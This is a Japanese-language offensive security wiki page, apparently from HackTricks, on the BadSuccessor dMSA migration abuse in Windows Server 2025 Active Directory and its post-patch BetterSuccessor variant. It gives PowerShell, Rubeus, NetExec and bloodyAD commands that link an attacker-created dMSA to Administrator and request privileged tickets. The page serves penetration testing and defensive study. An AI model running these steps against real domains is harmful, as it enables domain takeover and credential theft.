# BadSuccessor

{{#include ../../../banners/hacktricks-training.md}}

## 概要

**BadSuccessor** は、**Windows Server 2025** で導入された **delegated Managed Service Account**（**dMSA**）の移行ワークフローを悪用します。dMSA は **`msDS-ManagedAccountPrecededByLink`** を使ってレガシーアカウントにリンクでき、**`msDS-DelegatedMSAState`** に保存された移行状態を進めることができます。攻撃者が書き込み可能な OU に dMSA を作成し、それらの属性を制御できる場合、KDC は、リンクされたアカウントの **authorization context** を持つ、攻撃者が制御する dMSA のチケットを発行できます。<sup>[[2]](#references)</sup>

実際には、OU に対する委任された権限しか持たない低権限ユーザーでも、新しい dMSA を作成し、`Administrator` をリンク先に指定して移行状態を完了させることで、PAC に **Domain Admins** などの特権グループが含まれる TGT を取得できます。<sup>[[2]](#references)</sup>

## 重要な dMSA 移行の詳細

- dMSA は **Windows Server 2025** の機能です。
- `Start-ADServiceAccountMigration` は移行状態を **started** に設定します。
- `Complete-ADServiceAccountMigration` は移行状態を **completed** に設定します。
- `msDS-DelegatedMSAState = 1` は移行が開始されたことを意味します。
- `msDS-DelegatedMSAState = 2` は移行が完了したことを意味します。
- 正規の移行では、dMSA は置き換え対象のアカウントを透過的に置き換えることを意図しているため、KDC/LSA は以前のアカウントが持っていたアクセス権を維持します。<sup>[[3]](#references)</sup>

Microsoft Learn によると、移行中は元のアカウントが dMSA に紐づけられ、dMSA は以前のアカウントがアクセスできたリソースにアクセスすることを意図しています。<sup>[[3]](#references)</sup> これが BadSuccessor が悪用するセキュリティ上の前提です。<sup>[[2]](#references)</sup>

## 要件

1. **dMSA が存在する**ドメイン。つまり、AD 側で **Windows Server 2025** のサポートが必要です。
2. 攻撃者が、いずれかの OU に `msDS-DelegatedManagedServiceAccount` オブジェクトを**作成**できること。または、その OU で子オブジェクトを作成する同等の広範な権限を持っていること。
3. 攻撃者が、関連する dMSA 属性を**書き込み**できること、または作成した dMSA を完全に制御できること。
4. 攻撃者が、ドメイン参加済みの環境、または LDAP/Kerberos に到達できるトンネル経由で Kerberos チケットを要求できること。<sup>[[2]](#references)</sup>

### 実用的な確認方法

最も明確な operator 向けの確認方法は、ドメイン/フォレストのレベルを検証し、環境がすでに新しい Server 2025 スタックを使用していることを確認することです。

```powershell
Get-ADDomain | Select Name,DomainMode
Get-ADForest | Select Name,ForestMode
```

`Windows2025Domain` や `Windows2025Forest` のような値が見つかった場合は、**BadSuccessor / dMSA migration abuse** を優先的に確認してください。

public tooling を使って、dMSA の作成を委任された書き込み可能な OU を列挙することもできます。<sup>[[1]](#references)</sup>

```powershell
.\Get-BadSuccessorOUPermissions.ps1
```

```bash
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor
```

## Abuse flow

1. 委任された create-child 権限を持つ OU に dMSA を作成します。
2. **`msDS-ManagedAccountPrecededByLink`** に、`CN=Administrator,CN=Users,DC=corp,DC=local` のような特権ターゲットの DN を設定します。
3. **`msDS-DelegatedMSAState`** に `2` を設定し、移行が完了したことを示します。
4. 新しい dMSA の TGT を要求し、返されたチケットを使用して特権サービスにアクセスします。<sup>[[2]](#references)</sup>

PowerShell の例:<sup>[[2]](#references)</sup>

```powershell
New-ADServiceAccount -Name attacker_dMSA -DNSHostName host.corp.local -Path "OU=Delegated,DC=corp,DC=local"
Set-ADServiceAccount attacker_dMSA -Add @{
    msDS-ManagedAccountPrecededByLink="CN=Administrator,CN=Users,DC=corp,DC=local"
}
Set-ADServiceAccount attacker_dMSA -Replace @{msDS-DelegatedMSAState=2}
```

チケット要求／運用ツールの例:<sup>[[1]](#references)[[2]](#references)</sup>

```bash
Rubeus.exe asktgs /targetuser:attacker_dMSA$ /service:krbtgt/corp.local /dmsa /opsec /nowrap /ptt /ticket:<machine_tgt>
netexec ldap <dc> -u <user> -p '<pass>' -M badsuccessor -o TARGET_OU='OU=Delegated,DC=corp,DC=local' DMSA_NAME=attacker TARGET_ACCOUNT=Administrator
```

## これが単なる権限昇格ではない理由

正規の移行では、切り替え前に以前のアカウント向けに発行されたチケットを新しい dMSA が処理できる必要もあります。そのため、dMSA 関連のチケット情報には、**`KERB-DMSA-KEY-PACKAGE`** フローで**現在**のキーと**以前**のキーが含まれることがあります。<sup>[[2]](#references)</sup>

攻撃者が制御する偽の移行では、この動作により BadSuccessor は次のような攻撃につながる可能性があります。<sup>[[2]](#references)</sup>

- PAC 内の特権グループ SID を継承することによる**権限昇格**。
- 脆弱なワークフローで以前のキーを処理する際に、前身アカウントの RC4/NT hash と同等の情報が露出する可能性があるため、**認証情報の情報漏えい**。

このため、この手法はドメインの直接的な乗っ取りだけでなく、pass-the-hash やより広範な認証情報の侵害など、その後の攻撃にも有用です。

## KDC のパッチ適用後の BetterSuccessor

パッチ適用済みの KDC は、dMSA 移行の両側を検証します。dMSA の `msDS-ManagedAccountPrecededByLink` と移行状態に加え、前身アカウントから dMSA への `msDS-SupersededManagedAccountLink` と、互換性のある `msDS-SupersededServiceAccountState` も必要です。一方向のリンクは拒否されるため、dMSA を作成できるだけのアカウントでは、任意の前身アカウントを指定できなくなりました。OU 内で dMSA に対する `CreateChild` があり、**かつ**選択した対象アカウントの移行属性への実効的な書き込みアクセスがある場合、攻撃者は相互リンクを設定できます。結果として得られる dMSA チケットには、前身アカウントの認可コンテキストが含まれ、そのキーが dMSA key package 内で露出する可能性があります。これは標的型の認証情報アクセス／権限増幅の経路であり、パッチ適用済み DC でも、従来の任意の対象を指定できる BadSuccessor が引き続き悪用可能であることを示すものではありません。<sup>[[5]](#references)[[6]](#references)</sup>

対象アカウントへの書き込み権限が確認されているラボ環境では、`bloodyAD` を使って dMSA を作成し、対応する移行属性への書き込みを実行できます。返された Kerberos 情報を使って dMSA チケットを要求し、対象アカウントの実際の権限を確認してから、その権限や hash を取得できたと判断してください。ツールの `badSuccessor` サブコマンド名は、パッチ適用前の一方向の動作を意味するものではありません。<sup>[[7]](#references)</sup>

```bash
KRB5CCNAME=operator.ccache bloodyAD -d example.local --host dc.example.local -k add badSuccessor test_dmsa --ou 'OU=DMSAHolder,DC=example,DC=local' -t 'CN=Target User,OU=Users,DC=example,DC=local'
```

## パッチ適用状況に関する注意

元のBadSuccessorの挙動は、**2025年の理論上のプレビューに限った問題ではありません**。Microsoftはこれに**CVE-2025-53779**を割り当て、**2025年8月**にセキュリティ更新プログラムを公開しました。<sup>[[4]](#references)</sup> 以下のケースでも、この攻撃の記録を残してください。

- **ラボ / CTF / assume-breach演習**
- **未パッチのWindows Server 2025環境**
- **評価時のOU委任とdMSAの露出状況の検証**

dMSAが存在するという理由だけで、Windows Server 2025ドメインに脆弱性があると決めつけないでください。パッチレベルを確認し、慎重にテストしてください。

## ツール

- [Akamai BadSuccessor tooling](https://github.com/akamai/BadSuccessor)
- [SharpSuccessor](https://github.com/logangoins/SharpSuccessor)
- [NetExec `badsuccessor` module](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/badsuccessor.py)

## References

- [1] [HTB: Eighteen - BadSuccessor dMSAの悪用によるDomain Adminへの昇格 (0xdf)](https://0xdf.gitlab.io/2026/04/11/htb-eighteen.html)
- [2] [Akamai - BadSuccessor: Active Directoryでの権限昇格を目的としたdMSAの悪用](https://www.akamai.com/blog/security-research/abusing-dmsa-for-privilege-escalation-in-active-directory)
- [3] [Microsoft Learn - Delegated Managed Service Accountsの概要](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/delegated-managed-service-accounts/delegated-managed-service-accounts-overview)
- [4] [Microsoft Security Response Center - CVE-2025-53779](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-53779)
- [5] [Akamai - BadSuccessorは死んだ。BadSuccessorよ永遠に（？）](https://www.akamai.com/blog/security-research/badsuccessor-is-dead-analyzing-badsuccessor-patch)
- [6] [Altered Security - BetterSuccessor: パッチ適用後も続くdMSAの悪用](https://www.alteredsecurity.com/post/bettersuccessor-still-abusing-dmsa-for-privilege-escalation-badsuccessor-after-patch)
- [7] [0xdf - HTB: Checkpoint](https://0xdf.gitlab.io/2026/10/24/htb-checkpoint.html)
{{#include ../../../banners/hacktricks-training.md}}
